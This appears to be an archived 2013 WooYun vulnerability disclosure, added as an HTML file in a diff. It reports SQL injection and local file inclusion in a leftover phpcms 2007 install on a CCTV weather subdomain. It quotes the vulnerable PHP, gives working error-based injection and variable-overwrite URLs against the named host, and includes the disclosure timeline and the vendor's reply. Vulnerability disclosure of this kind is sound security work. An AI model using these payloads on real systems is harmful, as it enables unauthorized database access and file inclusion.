@@ -1,0 +1,201 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		CCTV分站SQL注入+本地文件包含（phpcms某版本新漏洞）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		CCTV分站SQL注入+本地文件包含（phpcms某版本新漏洞）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/b4dboy">b4dboy</a> 
+</li><li>提交时间：		2013-04-20 23:33</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-04-20：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-04-22：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-05-02：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-05-12：	细节向普通白帽子公开<br/>
+									2013-05-22：	细节向实习白帽子公开<br/>
+									2013-06-04：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">某分站残留着一套老程序。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">　　下午去参加了乌云和广测举办的沙龙观望了各种大牛，回来的时候赶上了暴雨那叫一个湿身呀，于是晚上就搜索了下最近的天气接着就点进了cctv的天气频道。<br />
+<br />
+　　<br />
+<br />
+　　在天气频道的cms目录下发现还残留着一套phpcms 2007。这可是一个相当老的版本呀,说不定可以刷点乌云币呢(PS：沙龙上听说乌云币过200的就能找到月薪8k的工作)。<br />
+<br />
+　　<br />
+<br />
+　　搜索了一些phpcms 2007的漏洞测试均没有成功而且他这个也删掉了很多模块，xday行不通就只能用0day啦，嘎嘎。下载了一套phpcms 2007进行分析，在module\movie\onunload.inc.php里发现了一个update型的注入。<br />
+<br />
+</p><pre><code>&lt;?php <br />
+defined(&#039;IN_PHPCMS&#039;) or exit(&#039;Access Denied&#039;);<br />
+$serverid ? 1 : showmessage($LANG[&#039;illegal_operation&#039;]);<br />
+$db-&gt;query(&quot;UPDATE &quot;.TABLE_MOVIE_SERVER.&quot; SET `num` = (num-1) WHERE serverid = $serverid AND num &gt; 0 &quot;);<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+$serverid没有进行任何过滤也没有用单引号括起来，所以无视gpc。<br />
+<br />
+<br />
+<br />
+核心文件include\common.inc.php里大概80左右变量覆盖漏洞。<br />
+<br />
+</p><pre><code>if($PHP_QUERYSTRING &amp;&amp; preg_match(&quot;/^(.*)\.(htm|html|shtm|shtml)$/&quot;, $PHP_QUERYSTRING, $urlvar))<br />
+{<br />
+	parse_str(str_replace(array(&#039;/&#039;, &#039;-&#039;, &#039; &#039;), array(&#039;&amp;&#039;, &#039;=&#039;, &#039;&#039;), $urlvar[1]));<br />
+}</code></pre><p class='detail'><br />
+<br />
+这个判断太弱了，判断querystring是不是等于静态文件后缀，结尾随便加个参数赋个静态文件的值就过了，经过parse_str就产生了。<br />
+<br />
+<br />
+<br />
+漏洞太多了不继续分析了。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">http://weather.cctv.com/cms/movie/onunload.php?serverid=1+and+exists%28select*from+%28select*from%28select+name_const%28@@version,0%29%29a+join+%28select+name_const%28@@version,0%29%29b%29c%29<br />
+<br />
+</p><p class="detail"><a href="../images/2023330999324ae2f87f93474038ef80288760ba.png" target="_blank"><img src="../images/2023330999324ae2f87f93474038ef80288760ba.png" alt="11.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+http://weather.cctv.com/cms/movie/onunload.php?serverid=1&amp;db_file=b4dboy&amp;x.htm </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">建议下架掉这套残留程序 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/b4dboy" title="b4dboy">b4dboy</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-022217" title="CCTV分站SQL注入+本地文件包含（phpcms某版本新漏洞）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：18 </p>
+													<p class="detail">确认时间：2013-04-22 09:52</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢，我们将尽快整改。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="22217";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
